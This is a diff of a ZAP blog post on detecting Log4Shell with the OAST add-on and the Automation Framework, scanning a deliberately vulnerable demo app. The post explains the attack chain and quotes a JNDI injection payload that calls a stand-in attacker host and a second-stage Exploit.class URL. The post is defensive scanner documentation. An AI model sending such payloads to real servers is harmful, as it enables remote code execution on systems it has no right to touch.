@@ -1,8 +1,8 @@
 ---
-title: "Automating Log4Shell Detection with OAST and the ZAP Automation Framework"
+title: "Log4Shell Detection with ZAP"
 summary: "A walkthrough of using the new Log4Shell Alpha Active Scan rule with the ZAP Automation Framework."
 images:
-- https://www.zaproxy.org/blog/2021-12-14-automating-log4shell-detection-with-oast-and-af/images/log4shell-zap.png
+- https://www.zaproxy.org/blog/2021-12-14-log4shell-detection-with-zap/images/log4shell-zap.png
 type: post
 tags:
 - blog
@@ -13,32 +13,46 @@ authors:
 - akshath
 ---
 
-Our last blog post talked about how ZAP 2.11.0 was vulnerable to Log4Shell and our efforts to patch it. In this blog post we are going to look at detecting Log4Shell with the ZAP Automation Framework and the OAST add-on. 
+Our [last blog post](/blog/2021-12-10-zap-and-log4shell/) talked about how ZAP 2.11.0 was potentially vulnerable to Log4Shell and how we fixed that. In this blog post we are going to look at detecting Log4Shell with the ZAP Automation Framework and the OAST add-on. 
 
-We recently added a new scan rule to detect Log4Shell in the alpha active scanner rules add-on. To use it, you will need to:
-1. Install the Active scanner rules (alpha) add-on from the [ZAP Marketplace](https://www.zaproxy.org/addons/).
-2. [Enable an OAST service](https://www.zaproxy.org/docs/desktop/addons/oast-support/options/#active-scan-service) that will be used in Active Scan Rules (explained why below).
-3. Launch an Active Scan against the application you want to test. You can do this from the GUI, but in this post we will be using the ZAP automation framework and do everything from the CLI.
+## The New ZAP Log4Shell Active Scan Rule
+
+We recently added a new scan rule to detect Log4Shell in the [alpha active scanner rules](/docs/desktop/addons/active-scan-rules-alpha/) add-on. To use it, you will need to:
+1. Install the Active scanner rules (alpha) add-on from the [ZAP Marketplace](/addons/).
+2. [Enable an OAST service](/docs/desktop/addons/oast-support/options/#active-scan-service) that will be used in Active Scan Rules (explained why below).
+3. Launch an Active Scan against the application you want to test. You can do this from the GUI, but in this post we will be using the ZAP [Automation Framework](/docs/desktop/addons/automation-framework/) and do everything from the CLI.
+
+By default ZAP does not actively scan HTTP headers as this can significantly increase the scan time.
+However this vulnerability is often exposed via headers so we recommend scanning them in this case.
+Instead of turning them on for all scan rules you can just perform a scan using this scan rule, which is what we demonstrate below.
+
+## Out of Band Testing
 
 To understand why we need out-of-band testing to detect Log4Shell, we must first understand how the attack works at a high level.
 
 As explained at https://log4shell.com,
 1. Data taken from the user is sent to the server (via any protocol).
-1. The server logs the request data, which includes the malicious payload: `${jndi:ldap://attacker.com/abc}` (where `attacker.com` is an attacker controlled server).
-1. This payload triggers the log4j vulnerability, and the server sends a request to attacker.com via the "Java Naming and Directory Interface" (JNDI) protocol.
-1. The response from the attacker controlled server includes a URL to a remote Java class file (for example, `http://second-stage.attacker.com/Exploit.class`) that is injected into the server process.
+1. The server logs the request data, which includes the malicious payload: `${jndi:ldap://attacker.example.com/abc}` (where `attacker.example.com` is an attacker controlled server).
+1. This payload triggers the log4j vulnerability, and the server sends a request to attacker.example.com via the "Java Naming and Directory Interface" (JNDI) protocol.
+1. The response from the attacker controlled server includes a URL to a remote Java class file (for example, `http://second-stage.attacker.example.com/Exploit.class`) that is injected into the server process.
 1. The second stage is triggered by the injected payload, which allows an attacker to run arbitrary code.
 
 Note the third point above. 
 
-> The server sends a request to attacker.com
+> The server sends a request to attacker.example.com
 
-We need a way to verify that this request was made. This is where OAST comes in. Here's how a typical active scan rule that makes use of the [OAST add-on for ZAP](https://www.zaproxy.org/docs/desktop/addons/oast-support/) proceeds:
+## The OAST Add-on
+
+We need a way to verify that this request was made. This is where OAST comes in. Here's how a typical active scan rule that makes use of the [OAST add-on for ZAP](/docs/desktop/addons/oast-support/) proceeds:
 
 1. Obtain a unique domain from the OAST add-on.
-2. Insert the domain into a known Log4Shell payload, like `${jndi:ldap://attacker.com/abc}` above.
-3. Poll the selected OAST service to check for DNS interactions at the domain. ZAP currently supports two third-party open source OAST services - [BOAST](https://github.com/marcoagner/boast) and [Interactsh](https://github.com/projectdiscovery/interactsh). It also supports a [Callbacks](https://www.zaproxy.org/docs/desktop/addons/oast-support/services/callbacks/) service which is hosted on the same server as ZAP. By default, ZAP uses the free, publicly hosted instances of BOAST or Interactsh but you can also host them on your own and configure them in ZAP.
+2. Insert the domain into a known Log4Shell payload, like `${jndi:ldap://attacker.example.com/abc}` above.
+3. Poll the selected OAST service to check for DNS interactions at the domain. 
 4. An alert is raised if any interactions were made to the OAST service.
+
+ZAP currently supports two third-party open source OAST services - [BOAST](https://github.com/marcoagner/boast) and [Interactsh](https://github.com/projectdiscovery/interactsh). It also supports a [Callbacks](/docs/desktop/addons/oast-support/services/callbacks/) service which is hosted on the same server as ZAP. By default, ZAP uses the free, publicly hosted instances of BOAST or Interactsh but you can also host them on your own and configure them in ZAP.
+
+## A Walkthrough Example
 
 Let’s look at the scan rule in action against a deliberately vulnerable app. Feel free to follow along.
 
@@ -125,7 +139,7 @@ Run ZAP against the demo app with:
 ```
 Replace `/path/to/…` with the full path of the files.
  
-The generated report should show the vulnerability :).
+The generated report should show the vulnerability :smile:.
  
 ```json
 {
@@ -183,5 +197,11 @@ The generated report should show the vulnerability :).
 	]
 }
 ```
- 
-It should be noted that some apps may require authentication to properly detect this vulnerability. We always recommend running authenticated scans in a safe environment, and if you are doing that then you should check if your app can reach your chosen OAST server (eg `ping interactsh.com`).
+
+## Authentication
+
+While many apps are vulnerable to Log4Shell with no authentication you should not assume that this will always be the case.
+
+If an app only uses Log4j to log data from authenticated users then you will only find the vulnerabilities by performing an authenticated scan.
+
+We always recommend running authenticated scans in a safe environment, and if you are doing that then you should check if your app can reach your chosen OAST server (e.g. `ping interactsh.com`). 
